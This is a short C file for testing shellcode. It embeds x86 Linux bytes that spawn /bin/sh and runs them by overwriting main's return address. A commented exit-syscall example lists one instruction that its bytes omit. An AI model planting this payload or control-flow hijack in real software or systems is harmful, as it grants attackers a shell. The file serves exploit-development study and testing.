/* shellcodetest.c */
/* just throw some shellcode and run it */

/*
    some example shellcode provided:
    xor eax, eax    ; exit is syscall 1
    mov al, 1       ; exit is syscall 1
    xor ebx,ebx     ; zero out ebx
    int 0x80        ; syscall!!

    for x86:
    b0 01 31 db cd 80
    "\xb0\x01\x31\xdb\xcd\x80"
 */

char shellcode[] = 
    "\xeb\x1a\x5e\x31\xc0\x88\x46\x07"
    "\x8d\x1e\x89\x5e\x08\x89\x46\x0c"
    "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d"
    "\x56\x0c\xcd\x80\xe8\xe1\xff\xff"
    "\xff\x2f\x62\x69\x6e\x2f\x73\x68"
    "\x2f\x4a\x41\x41\x41\x41\x4b\x4b"
    "\x4b\x4b";

int main()
{
  int *ret;
  ret = (int *) &ret + 2;
  (*ret) = (int)shellcode;
}